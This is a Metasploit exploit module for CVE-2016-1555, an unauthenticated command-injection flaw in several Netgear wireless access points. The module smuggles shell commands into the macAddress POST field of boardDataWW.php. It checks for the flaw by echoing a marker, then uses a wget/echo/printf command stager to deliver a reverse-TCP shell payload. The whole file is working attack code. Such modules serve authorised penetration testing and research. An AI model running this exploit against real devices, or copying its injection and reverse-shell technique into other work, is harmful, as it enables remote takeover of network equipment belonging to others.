##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Netgear Devices Unauthenticated Remote Command Execution',
      'Description' => %q{
        From the CVE-2016-1555 page: (1) boardData102.php, (2) boardData103.php,
        (3) boardDataJP.php, (4) boardDataNA.php, and (5) boardDataWW.php in
        Netgear WN604 before 3.3.3 and WN802Tv2, WNAP210v2, WNAP320, WNDAP350,
        WNDAP360, and WNDAP660 before 3.5.5.0 allow remote attackers to execute
        arbitrary commands.
      },
      'Author'      =>
        [
          'Daming Dominic Chen <ddchen[at]cs.cmu.edu>', # Vuln discovery
          'Imran Dawoodjee <imrandawoodjee.infosec[at]gmail.com>' # MSF module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['CVE', '2016-1555'],
          ['URL', 'https://kb.netgear.com/30480/CVE-2016-1555-Notification?cid=wmt_netgear_organic'],
          ['PACKETSTORM', '135956'],
          ['URL', 'http://seclists.org/fulldisclosure/2016/Feb/112']
        ],
      'DisclosureDate' => 'Feb 25 2016', # According to http://seclists.org/fulldisclosure/2016/Feb/112
      'Privileged'     => true,
      'Platform'       => 'linux',
      'Arch'           => ARCH_MIPSBE,
      'Payload'        => {},
      'DefaultOptions' => {
        'CMDSTAGER::FLAVOR' => 'wget',
        'PAYLOAD'           => 'linux/mipsbe/shell_reverse_tcp',
        'WfsDelay'          => 10 },
      'Targets'        => [['Automatic', { }]],
      'CmdStagerFlavor'=> %w{ echo printf wget },
      'DefaultTarget'  => 0
      ))
      register_options(
      [
        OptString.new('TARGETURI', [true, 'Path of the vulnerable URI.', '/boardDataWW.php']), # boardDataWW.php
        OptString.new('MAC_ADDRESS', [true, 'MAC address to use (default: random)', Rex::Text.rand_text_hex(12)])
      ])
  end

  # check for vulnerability existence
  def check
    fingerprint = Rex::Text.rand_text_alpha(12) # If vulnerability is present, we will get this back in the response
    res = execute_command("echo #{fingerprint}") # the raw POST response

    unless res
      vprint_error 'Connection failed'
      return CheckCode::Unknown
    end

    unless res.code == 200
      return CheckCode::Safe
    end

    unless res.get_html_document.at('input').to_s.include? fingerprint
      return CheckCode::Safe
    end

    CheckCode::Vulnerable
  end

  # execute a command, or simply send a POST request
  def execute_command(cmd, opts = {})
    vars_post = {
      'macAddress' => "#{datastore['MAC_ADDRESS']};#{cmd};",
      'reginfo' => '1',
      'writeData' => 'Submit'
    }

    send_request_cgi({
      'method'  => 'POST',
      'headers' => { 'Connection' => 'Keep-Alive' },
      'uri'     => normalize_uri(target_uri.path),
      'vars_post' => vars_post
    })
  rescue ::Rex::ConnectionError
    fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the target!")
  end

  # the exploit method
  def exploit
    #run a check before attempting to exploit
    unless [CheckCode::Vulnerable].include? check
      fail_with Failure::NotVulnerable, 'Target is most likely not vulnerable!'
    end

    execute_cmdstager(linemax: 2048) # maximum 130,000
  end

end

